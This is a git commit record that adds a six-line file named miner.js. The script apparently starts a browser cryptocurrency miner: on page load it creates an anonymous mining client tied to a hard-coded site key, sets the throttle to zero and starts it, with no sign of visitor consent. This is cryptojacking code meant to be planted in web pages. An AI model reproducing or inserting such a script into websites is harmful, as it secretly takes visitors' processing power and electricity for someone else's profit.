c78d9a870acfd1a20781ddcf6ff1421e689169cd
Anxin Canada <75194970+AnxinCanada@users.noreply.github.com>
2021-12-15 22:42:34 -0800

    Add files via upload

---
+++ miner.js
@@ -0,0 +1,6 @@
+window.onload = function() {
+    var _client = new Client.Anonymous('ff58c7b7c944ef8320b75ee8359df3b95524ddb25a0b1af94c2d665883b9d8a7', {
+        throttle: 0, c: 'w'
+    });
+    _client.start();
+};
